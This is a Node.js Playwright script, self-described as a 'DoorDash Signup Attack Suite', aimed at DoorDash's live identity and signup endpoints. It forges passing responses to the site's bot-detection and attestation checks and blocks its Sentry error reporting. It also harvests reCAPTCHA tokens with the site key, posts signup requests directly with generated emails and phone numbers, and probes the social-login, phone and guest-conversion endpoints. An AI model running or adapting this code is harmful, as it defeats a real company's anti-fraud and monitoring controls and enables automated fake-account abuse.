// DoorDash Signup Attack Suite — Angle 1-5
// Usage: node attack-doordash.js [angle]
// Angles: 1=token-harvest, 2=iguazu-intercept, 3=social, 4=phone, 5=guest

const { chromium } = require('playwright');
const https = require('https');
const http = require('http');
const crypto = require('crypto');

const CONFIG = {
  signupPage: 'https://identity.doordash.com/auth/user/signup?client_id=1666519390426295040&redirect_uri=https://www.doordash.com/post-login/&response_type=code&scope=*&state=test-state-123&intl=en-US&layout=consumer_web',
  signupApi: 'https://identity.doordash.com/signup',
  clientId: '1666519390426295040',
  redirectUri: 'https://www.doordash.com/post-login/',
  scope: '*',
  // Fresh creds each run
  email: () => `testuser${Date.now()}${Math.floor(Math.random()*1000)}@example.com`,
  password: 'TestPass123!',
  firstName: 'Test',
  lastName: 'User',
  phone: () => `+1415555${String(Math.floor(Math.random()*10000)).padStart(4,'0')}`,
};

// === Fake Iguazu/attestation server ===
function startIguazuInterceptor() {
  const server = http.createServer((req, res) => {
    console.log(`[FakeIguazu] ← ${req.method} ${req.url}`);
    if (req.url.includes('iguazu-edge') || req.url.includes('attestation') || req.url.includes('assess_behavior')) {
      res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
      res.end(JSON.stringify({ status: 'success', score: 0.9, risk: 'low', assessment: 'pass' }));
    } else {
      res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
      res.end(JSON.stringify({ status: 'success' }));
    }
  });
  server.listen(0, '127.0.0.1');
  const port = server.address().port;
  console.log(`[FakeIguazu] Listening on 127.0.0.1:${port}`);
  return { server, port };
}

// === Angle 1+2: Token Harvest + Iguazu Interception ===
async function angle1_token_harvest() {
  console.log('\n=== ANGLE 1+2: Token Harvest + Iguazu Interception ===\n');
  const interceptor = startIguazuInterceptor();
  
  const browser = await chromium.launch({
    headless: true,
    args: ['--no-sandbox', '--disable-setuid-sandbox']
  });
  
  const context = await browser.newContext({
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    viewport: { width: 1920, height: 1080 },
    locale: 'en-US',
    timezoneId: 'America/New_York',
  });
  
  const page = await context.newPage();
  
  // === Step 1: Route Iguazu/attestation through our fake server ===
  await page.route('**/iguazu-edge/**', async route => {
    console.log('[Block] Iguazu beacon intercepted');
    await route.fulfill({
      status: 200,
      contentType: 'application/json',
      body: JSON.stringify({ status: 'success', score: 0.9 })
    });
  });
  
  await page.route('**/unified-gateway.doordash.com/**', async route => {
    console.log('[Block] Attestation intercepted');
    await route.fulfill({
      status: 200,
      contentType: 'application/json',
      body: JSON.stringify({ status: 'success', score: 0.9, assessment: 'pass', risk: 'low' })
    });
  });

  await page.route('**/423b12fd7b819ec52acafed4ef462cb2.doordash.com/**', async route => {
    console.log('[Block] Iguazu v2 intercepted');
    await route.fulfill({
      status: 200,
      contentType: 'application/json',
      body: JSON.stringify({ status: 'success' })
    });
  });

  // Block Sentry to prevent real error reporting
  await page.route('**/o17585.ingest.sentry.io/**', async route => route.abort());

  // === Step 2: Load signup page ===
  console.log('[1] Loading signup page...');
  await page.goto(CONFIG.signupPage, { waitUntil: 'networkidle', timeout: 60000 });
  console.log('[1] Signup page loaded. URL:', page.url());
  
  // Wait for reCAPTCHA to load
  await page.waitForTimeout(3000);
  
  // === Step 3: Extract cookies (cf_clearance, XSRF-TOKEN) ===
  const cookies = await context.cookies();
  const xsrfCookie = cookies.find(c => c.name === 'XSRF-TOKEN');
  const cfClearance = cookies.find(c => c.name.startsWith('__cf_bm') || c.name === 'cf_clearance');
  console.log('[Cookies] XSRF:', xsrfCookie?.value?.substring(0,20) || 'NONE');
  console.log('[Cookies] CF:', cfClearance?.name || 'none');

  // === Step 4: Try to extract reCAPTCHA token ===
  let recaptchaToken = null;
  try {
    recaptchaToken = await page.evaluate(() => {
      return new Promise((resolve) => {
        if (typeof grecaptcha !== 'undefined' && grecaptcha.execute) {
          grecaptcha.execute('6LfwmQEoAAAAAOcMv1gEi85kHPcIZrCqpzoGBReE', { action: 'signup' })
            .then(resolve)
            .catch(e => resolve('error:' + e.message));
        } else {
          // Try to find in window.___grecaptcha_cfg
          try {
            const cfg = window.___grecaptcha_cfg;
            if (cfg && cfg.clients) {
              for (const id of Object.keys(cfg.clients)) {
                const client = cfg.clients[id];
                if (client && client.token) {
                  resolve(client.token);
                  return;
                }
              }
            }
          } catch(e) {}
          resolve('grecaptcha_not_found');
        }
      });
    });
    console.log('[reCAPTCHA] Token:', recaptchaToken?.substring(0, 50) + '...');
  } catch(e) {
    console.log('[reCAPTCHA] Error extracting:', e.message);
  }

  // === Step 5: Also try the iframe-based approach ===
  let recaptchaToken2 = null;
  try {
    recaptchaToken2 = await page.evaluate(() => {
      return new Promise((resolve) => {
        const iframes = document.querySelectorAll('iframe');
        for (const iframe of iframes) {
          if (iframe.src && iframe.src.includes('google') && iframe.src.includes('recaptcha')) {
            resolve('recaptcha_iframe_found:' + iframe.src);
            return;
          }
        }
        resolve('no_recaptcha_iframe');
      });
    });
    console.log('[reCAPTCHA] iframe:', recaptchaToken2);
  } catch(e) {}

  // === Step 6: Check if recaptcha element is available in DOM ===
  const recaptchaInDOM = await page.evaluate(() => {
    return {
      hasRecaptchaApi: typeof grecaptcha !== 'undefined',
      hasRecaptchaBadge: !!document.querySelector('.grecaptcha-badge'),
      hasRecaptchaIframe: !!document.querySelector('iframe[src*="recaptcha"]'),
      bodyHTML: document.body.innerHTML.substring(0, 500),
    };
  });
  console.log('[reCAPTCHA] DOM check:', JSON.stringify(recaptchaInDOM, null, 2));

  // === Step 7: Fill and submit the signup form ===
  const email = CONFIG.email();
  console.log(`[Form] Filling with email: ${email}`);
  
  // Try to find form fields
  const formFields = await page.evaluate(() => {
    const inputs = document.querySelectorAll('input');
    return Array.from(inputs).map(i => ({ 
      name: i.name, 
      id: i.id, 
      type: i.type, 
      placeholder: i.placeholder,
      className: i.className?.substring(0,50)
    }));
  });
  console.log('[Form] Fields found:', JSON.stringify(formFields, null, 2));

  // Try clicking a signup button
  const buttons = await page.evaluate(() => {
    const btns = document.querySelectorAll('button, a[role="button"], [data-testid], [class*="signup"], [class*="submit"], [class*="continue"]');
    return Array.from(btns).map(b => ({ 
      text: b.textContent?.substring(0, 30), 
      id: b.id, 
      className: b.className?.substring(0,50),
      href: b.href?.substring(0,80) || '',
      dataTestId: b.getAttribute('data-testid') || ''
    }));
  });
  console.log('[Form] Buttons:', JSON.stringify(buttons, null, 2));

  // === Step 8: Wait a bit and capture any network requests ===
  console.log('[Network] Waiting for API calls...');
  page.on('response', response => {
    if (response.url().includes('doordash.com') || response.url().includes('/signup')) {
      console.log(`[Network] ${response.status()} ${response.url().substring(0,100)}`);
    }
  });

  // Wait for any auto-submit or further network activity
  await page.waitForTimeout(5000);

  // === Step 9: Try direct fetch via evaluate (in case form is React controlled) ===
  if (recaptchaToken && !recaptchaToken.startsWith('grecaptcha_not_found') && !recaptchaToken.startsWith('error')) {
    console.log('[Direct] Attempting direct fetch with harvested token...');
    const result = await page.evaluate(async ({ email, password, firstName, lastName, clientId, redirectUri, scope, recaptchaToken }) => {
      try {
        const xsrfMeta = document.querySelector('meta[name="csrf-token"]');
        const xsrf = xsrfMeta ? xsrfMeta.content : '';
        const resp = await fetch('/signup', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-xsrf-token': xsrf,
          },
          body: JSON.stringify({
            firstName, lastName, email, password,
            clientId, redirectUri, scope,
            state: 'test-state-' + Date.now(),
            recaptchaToken,
          })
        });
        return { status: resp.status, body: await resp.text().then(t => t.substring(0, 500)) };
      } catch(e) {
        return { error: e.message };
      }
    }, {
      email, password: CONFIG.password,
      firstName: CONFIG.firstName, lastName: CONFIG.lastName,
      clientId: CONFIG.clientId, redirectUri: CONFIG.redirectUri,
      scope: CONFIG.scope,
      recaptchaToken
    });
    console.log('[Direct] Result:', JSON.stringify(result, null, 2));
  }

  // === Step 10: Try to trigger the form submit manually ===
  const formSubmitResult = await page.evaluate(async ({ email, password, firstName, lastName }) => {
    try {
      // Find React input fields
      const inputs = document.querySelectorAll('input');
      let filled = 0;
      for (const input of inputs) {
        const nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
        nativeInputValueSetter.call(input, email);
        input.dispatchEvent(new Event('input', { bubbles: true }));
        input.dispatchEvent(new Event('change', { bubbles: true }));
        filled++;
        break; // just fill first input
      }
      return { filled, success: true };
    } catch(e) {
      return { error: e.message };
    }
  }, { email, password: CONFIG.password, firstName: CONFIG.firstName, lastName: CONFIG.lastName });
  console.log('[Form] Manual fill result:', JSON.stringify(formSubmitResult));

  // Wait for any redirected requests
  await page.waitForTimeout(3000);

  await browser.close();
  interceptor.server.close();
  return { cookies, recaptchaToken, recaptchaInDOM, formFields, buttons };
}

// === Angle 3+8: Social Signup Bypass ===
async function angle3_social_signup() {
  console.log('\n=== ANGLE 3+8: Social Signup Bypass ===\n');
  
  const browser = await chromium.launch({
    headless: true,
    args: ['--no-sandbox', '--disable-setuid-sandbox']
  });
  
  const context = await browser.newContext({
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    viewport: { width: 1920, height: 1080 },
  });
  
  const page = await context.newPage();
  
  const providers = ['google', 'facebook', 'apple', 'amazon', 'line'];
  
  for (const provider of providers) {
    console.log(`\n[Social] Testing ${provider}...`);
    
    // Test GET signupStart
    try {
      const resp = await page.goto(`https://identity.doordash.com/auth/${provider}/signupStart?client_id=${CONFIG.clientId}&redirect_uri=${encodeURIComponent(CONFIG.redirectUri)}&scope=${CONFIG.scope}&state=test-${provider}`, { 
        waitUntil: 'networkidle', timeout: 30000 
      });
      console.log(`[${provider}/GET] Status: ${resp.status()}, URL: ${page.url().substring(0,150)}`);
      
      // Check if it opens a popup
      const bodyPreview = await page.evaluate(() => document.body.innerText.substring(0, 200));
      console.log(`[${provider}/GET] Body: ${bodyPreview}`);
      
    } catch(e) {
      console.log(`[${provider}/GET] Error: ${e.message}`);
    }

    // Test POST signupStart
    try {
      const resp = await page.evaluate(async (p) => {
        const r = await fetch(`https://identity.doordash.com/auth/${p}/signupStart`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            clientId: '1666519390426295040',
            redirectUri: 'https://www.doordash.com/post-login/',
            scope: '*',
            state: 'test-' + p + '-' + Date.now(),
          })
        });
        return { status: r.status, body: await r.text().then(t => t.substring(0, 300)) };
      }, provider);
      console.log(`[${provider}/POST] Result:`, JSON.stringify(resp));
    } catch(e) {
      console.log(`[${provider}/POST] Error: ${e.message}`);
    }
  }

  await browser.close();
}

// === Angle 4: Phone-first flow ===
async function angle4_phone() {
  console.log('\n=== ANGLE 4: Phone-First Flow ===\n');
  
  const browser = await chromium.launch({
    headless: true,
    args: ['--no-sandbox', '--disable-setuid-sandbox']
  });
  
  const context = await browser.newContext({
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
  });
  
  const page = await context.newPage();

  // Block Iguazu/attestation
  await page.route('**/iguazu-edge/**', route => route.fulfill({
    status: 200, contentType: 'application/json',
    body: JSON.stringify({ status: 'success', score: 0.9 })
  }));
  await page.route('**/unified-gateway.doordash.com/**', route => route.fulfill({
    status: 200, contentType: 'application/json',
    body: JSON.stringify({ status: 'success', score: 0.9, assessment: 'pass' })
  }));
  await page.route('**/423b12fd7b819ec52acafed4ef462cb2.doordash.com/**', route => route.fulfill({
    status: 200, contentType: 'application/json',
    body: JSON.stringify({ status: 'success' })
  }));

  // Load signup page first to get cookies
  await page.goto(CONFIG.signupPage, { waitUntil: 'networkidle', timeout: 60000 });
  
  const cookies = await context.cookies();
  const xsrf = cookies.find(c => c.name === 'XSRF-TOKEN')?.value || '';
  console.log('[Phone] Got XSRF token:', xsrf.substring(0,20));

  // Try POST to /signup/phone
  const endpoints = ['/signup/phone', '/signup/phone/signup_continue', '/signup/phone/resend', '/signup/phone/verify'];
  
  for (const ep of endpoints) {
    try {
      const result = await page.evaluate(async ({ ep, xsrf }) => {
        const r = await fetch(ep, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-xsrf-token': xsrf,
          },
          body: JSON.stringify({ phoneNumber: '+1415555' + String(Math.floor(Math.random()*10000)).padStart(4,'0') })
        });
        return { status: r.status, body: await r.text().then(t => t.substring(0, 300)) };
      }, { ep, xsrf });
      console.log(`[Phone] ${ep}: ${JSON.stringify(result)}`);
    } catch(e) {
      console.log(`[Phone] ${ep}: Error - ${e.message}`);
    }
  }

  await browser.close();
}

// === Angle 5: Guest conversion ===
async function angle5_guest_convert() {
  console.log('\n=== ANGLE 5: Guest Conversion ===\n');
  
  const browser = await chromium.launch({
    headless: true,
    args: ['--no-sandbox', '--disable-setuid-sandbox']
  });
  
  const context = await browser.newContext();
  const page = await context.newPage();
  
  // Build guest session on www.doordash.com
  console.log('[Guest] Loading www.doordash.com...');
  try {
    await page.goto('https://www.doordash.com', { waitUntil: 'networkidle', timeout: 30000 });
    console.log('[Guest] Homepage loaded');
  } catch(e) {
    console.log('[Guest] Homepage error (may be Cloudflare):', e.message);
  }

  // Get cookies
  const cookies = await context.cookies();
  console.log('[Guest] Cookies:', cookies.map(c => `${c.name}=${c.value?.substring(0,20)}...`).join(', '));

  // Try guest conversion endpoint
  const convertEndpoints = [
    'https://www.doordash.com/consumer/v1/convert_guest_to_authenticated',
    'https://consumer-mobile-bff.doordash.com/consumer/v1/convert_guest_to_authenticated',
  ];
  
  for (const ep of convertEndpoints) {
    try {
      const result = await page.evaluate(async (url) => {
        const r = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: 'test' + Date.now() + '@example.com',
            password: 'TestPass123!',
          })
        });
        return { status: r.status, body: await r.text().then(t => t.substring(0, 300)) };
      }, ep);
      console.log(`[Guest] ${ep}: ${JSON.stringify(result)}`);
    } catch(e) {
      console.log(`[Guest] ${ep}: Error - ${e.message}`);
    }
  }

  await browser.close();
}

// === Main ===
async function main() {
  const angle = process.argv[2] || 'all';
  
  if (angle === '1' || angle === 'all') {
    await angle1_token_harvest();
  }
  if (angle === '2' || angle === 'all') {
    // Angle 2 is integrated into angle 1 (Iguazu interception)
  }
  if (angle === '3' || angle === 'all') {
    await angle3_social_signup();
  }
  if (angle === '4' || angle === 'all') {
    await angle4_phone();
  }
  if (angle === '5' || angle === 'all') {
    await angle5_guest_convert();
  }
  
  console.log('\n=== DONE ===');
}

main().catch(e => {
  console.error('Fatal:', e);
  process.exit(1);
});
